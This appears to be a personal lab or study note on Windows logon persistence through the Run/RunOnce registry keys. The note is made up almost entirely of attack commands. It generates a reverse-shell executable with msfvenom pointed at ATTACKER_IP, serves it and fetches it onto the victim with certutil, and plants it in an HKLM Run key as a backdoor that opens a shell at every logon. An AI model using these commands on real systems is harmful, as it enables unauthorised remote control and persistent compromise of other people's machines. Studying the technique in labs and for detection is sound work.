#### What is `Run/RunOnce`?
You can ***force a user to execute a program on logon via the registry***. Instead of delivering your payload into a specific directory, you can ***use the following registry entries to specify applications to run*** at logon:
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The ***registry entries under `HKCU` will only apply to the current user***, and those under ***`HKLM` will apply to everyone***. 

#### Create a Reverse shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4451 -f exe -o revshell.exe
```

#### Transfer the Payload to the Victim machine
**Attacker**
```bash
python3 -m http.server
```

**Victim**
```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/revshell.exe
move revshell.exe C:\Windows
```

#### Create a `REG_EXPAND_SZ` registry entry
For this use: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

**GUI**
`New --> Expandable String Value`

**Cmd.exe**
```cmd
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v <MyBackdoor>M /t REG_EXPAND_SZ /d "C:\Windows\revshell.exe" /f
```
![[Pasted image 20250530152342.png]]

**After this, sign out of your current session and log in again to receive a shell.**